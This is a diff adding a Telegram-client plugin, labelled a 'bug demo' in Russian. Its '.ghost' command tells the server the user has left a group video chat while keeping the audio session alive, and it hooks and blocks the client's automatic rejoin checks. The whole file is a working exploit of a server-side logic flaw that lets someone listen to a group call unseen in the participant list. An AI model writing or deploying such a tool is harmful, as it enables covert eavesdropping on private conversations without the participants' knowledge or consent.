@@ -1,0 +1,111 @@
+__id__ = "groupcall_hide_me_demo"
+__name__ = "GroupCall Ghost (demo)"
+__description__ = "Демо бага: пытается выписать тебя из реестра участников видеочата, не разрывая аудио. Команды в любом чате: .ghost / .unghost"
+__author__ = "LakendraHekmat"
+__version__ = "2.0.0"
+__min_version__ = "11.12.0"
+__icon__ = "exteraPlugins/1"
+
+from base_plugin import BasePlugin, MethodHook, HookResult, HookStrategy
+from hook_utils import find_class
+from client_utils import send_request
+from android_utils import log, run_on_ui_thread
+from java.lang import Boolean, Integer
+
+TLRPC = "org.telegram.tgnet.TLRPC$"
+
+
+def _field(obj, name):
+    f = obj.getClass().getDeclaredField(name)
+    f.setAccessible(True)
+    return f.get(obj)
+
+
+def _call_private(obj, name, types=(), args=()):
+    m = obj.getClass().getDeclaredMethod(name, *types)
+    m.setAccessible(True)
+    return m.invoke(obj, *args)
+
+
+def _service():
+    return find_class("org.telegram.messenger.voip.VoIPService").getSharedInstance()
+
+
+class _BlockWhenGhost(MethodHook):
+    """Пока призрак — не даём клиенту самому перезайти."""
+    def __init__(self, plugin):
+        self.plugin = plugin
+
+    def before_hooked_method(self, param):
+        if self.plugin.ghost:
+            param.setResult(None)
+
+
+class GhostDemo(BasePlugin):
+    def on_plugin_load(self):
+        self.ghost = False
+        try:
+            VoIP = find_class("org.telegram.messenger.voip.VoIPService").getClass()
+            # шортпол checkGroupCall: увидит «пропажу» и пересоздаст инстанс
+            self.hook_method(VoIP.getDeclaredMethod("startGroupCheckShortpoll"), _BlockWhenGhost(self))
+            # любой автоперезаход (GROUPCALL_JOIN_MISSING и т.п.)
+            self.hook_method(VoIP.getDeclaredMethod("createGroupInstance", Integer.TYPE, Boolean.TYPE), _BlockWhenGhost(self))
+            self.add_on_send_message_hook()
+            log("[Ghost] loaded")
+        except Exception as e:
+            log(f"[Ghost] load failed: {e}")
+
+    # ---------- команды ----------
+    def on_send_message_hook(self, account, params):
+        text = (getattr(params, "message", None) or "").strip().lower()
+        if text == ".ghost":
+            run_on_ui_thread(self._go_ghost)
+        elif text == ".unghost":
+            run_on_ui_thread(self._unghost)
+        else:
+            return HookResult()
+        return HookResult(strategy=HookStrategy.CANCEL)
+
+    # ---------- логика ----------
+    def _go_ghost(self):
+        svc = _service()
+        if svc is None or svc.groupCall is None:
+            log("[Ghost] not in a group call")
+            return
+        try:
+            my_source = _field(svc, "mySource")[0]
+            if my_source == 0:
+                log("[Ghost] not joined yet (no ssrc)")
+                return
+            self.ghost = True
+            _call_private(svc, "cancelGroupCheckShortPoll")
+
+            # Сервер получает «вышел», а медиа-инстанс (tgVoip) остаётся живым.
+            req = find_class(TLRPC + "TL_phone_leaveGroupCall")()
+            req.call = svc.groupCall.getInputGroupCall()
+            req.source = my_source
+
+            def done(resp, err):
+                if resp is not None:
+                    # обновления не применяем: иначе свой клиент тоже уберёт тебя и пересинхронится
+                    log(f"[Ghost] left registry, ssrc {my_source} kept alive")
+                else:
+                    log(f"[Ghost] leave failed: {err.text if err else '?'}")
+                    self.ghost = False
+
+            send_request(req, done)
+        except Exception as e:
+            self.ghost = False
+            log(f"[Ghost] error: {e}")
+
+    def _unghost(self):
+        self.ghost = False
+        svc = _service()
+        if svc is None:
+            return
+        try:
+            # штатный перезаход: новый инстанс -> phone.joinGroupCall
+            _call_private(svc, "createGroupInstance", (Integer.TYPE, Boolean.TYPE), (Integer(0), Boolean(False)))
+            log("[Ghost] rejoined")
+        except Exception as e:
+            log(f"[Ghost] rejoin failed: {e}")
